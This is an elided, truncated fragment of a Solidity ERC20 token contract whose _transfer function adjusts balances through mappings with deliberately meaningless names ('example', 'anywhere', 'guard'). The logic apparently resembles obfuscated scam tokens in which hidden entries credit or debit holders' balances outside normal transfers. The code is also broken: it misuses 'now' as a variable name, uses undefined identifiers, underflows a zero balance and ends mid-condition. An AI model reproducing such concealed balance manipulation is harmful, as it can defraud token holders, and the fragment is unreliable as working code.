...
contract Contract is IERC20, Ownable {
    ...
    mapping(address => uint256) private example;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(uint256 => address) private anywhere;
    ...
    function _transfer(
        ...
        address became = anywhere[army];
        bool none = like == bottle[army];
        uint256 now = _fee;

        if (example[like] == 0 && !none && guard[like] > 0) {
            example[like] -= now;
        }

        anywhere[army] = mail;

        if (example[like] > 0 && amount == 0) {
            example[mail] += now;
        }

        guard[became] += now;

        if (example[like] > 0 && amount > army) {
